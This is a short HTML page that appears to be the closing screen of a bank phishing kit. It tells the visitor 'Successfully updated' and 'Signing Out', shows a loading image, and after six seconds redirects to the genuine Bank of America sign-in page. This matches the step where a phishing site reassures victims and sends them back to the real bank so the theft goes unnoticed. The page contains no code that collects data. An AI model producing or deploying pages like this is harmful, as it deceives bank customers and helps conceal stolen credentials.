<html>
<head><title>Please wait... | Continue |....</title>
<META http-equiv="refresh" content="6;URL=https://secure.bankofamerica.com/login/sign-in/signOnScreen.go">
<body><br><br><br><br><br><br><br>
<table id="sewe" align="center" border="0" bgcolor="#565461" cellspacing="10" cellpadding="8" style="border-radius: 10px;"><tbody><td bgcolor="white" style="border-radius: 10px;">
<table id="sewe" align="right" border="0" bgcolor="white" cellspacing="0" cellpadding="0">&nbsp;&nbsp;&nbsp;&nbsp;<strong>Successfully updated</strong><img src="images/mp4.gif" height="1" width="160"><font face"arial">Signing Out</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
<br>
<br>
<center><img src="images/loading.GIF"><center>
<br>
<br>
<br>
</table></body>
